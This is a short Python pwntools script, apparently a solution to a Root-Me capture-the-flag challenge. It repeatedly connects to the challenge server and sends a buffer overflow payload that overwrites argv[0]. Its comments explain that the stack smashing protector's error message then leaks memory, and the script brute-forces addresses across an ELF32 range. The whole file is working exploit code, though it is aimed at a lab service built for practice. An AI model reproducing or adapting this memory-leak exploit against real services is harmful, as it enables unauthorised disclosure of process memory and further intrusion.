from pwn import *

start = 0x08040000 # staarting ADDR elf32
end = 0x0804ffff # end ADDR elf32

context.log_level = "none" # ??

while start < end:
    conn = remote('challenge03.root-me.org',  56529)
    conn.recvuntil('service: ')
    pd = b'A' * 256 + b'B' * 168 + p32(start) # Here 168 is the offset of argv[0]
    # since we pass far more char than the buffer we overwrite completely the stack which make us overwrite argv[0]
    # since the stack smashing protector use argv[0], it will write what contain argv[0], which is in our case the addr we overwrite with
    # we test for every addr between our 2 offsets
    conn.send(pd + b'\n')
    ret = conn.recv()
    print(b'[ ' + hex(start).encode() + b' ] = ' + ret)
    start += 1
    conn.close()

